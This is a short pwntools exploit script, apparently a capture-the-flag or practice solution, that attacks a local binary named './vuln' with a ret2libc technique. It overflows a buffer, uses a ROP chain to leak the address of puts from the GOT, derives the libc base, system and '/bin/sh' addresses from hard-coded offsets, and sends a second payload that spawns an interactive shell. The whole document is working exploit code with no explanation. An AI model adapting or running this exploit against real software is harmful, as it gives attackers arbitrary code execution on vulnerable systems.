from pwn import * 

p = process("./vuln")

pop_rdi  =  p64(0x00000000004011bb)
puts_got =  p64(0x404018)
puts_plt =  p64(0x0000000000401030)
main     =  p64(0x0000000000401132)

payload = "".join([
	"A"*40,
	pop_rdi,
	puts_got,
	puts_plt,
	main
	])
p.sendline(payload)
leak = u64(p.recv().split()[2].ljust(8,"\x00"))
log.info("leaked address of puts is : "+hex(leak))

libc_base = leak - 0x0000000000074040  # leak - puts
system = libc_base +0x0000000000046ff0
bin_sh = system + 0x13ccfe
log.info("base address is : "+hex(libc_base))
log.info("system address : "+hex(system))
log.info("/bin/sh address of puts is : "+hex(bin_sh))

payload = "".join([
	"A"*40,
	pop_rdi,
	p64(bin_sh),
	p64(system)
	])
p.sendline(payload)
p.interactive()

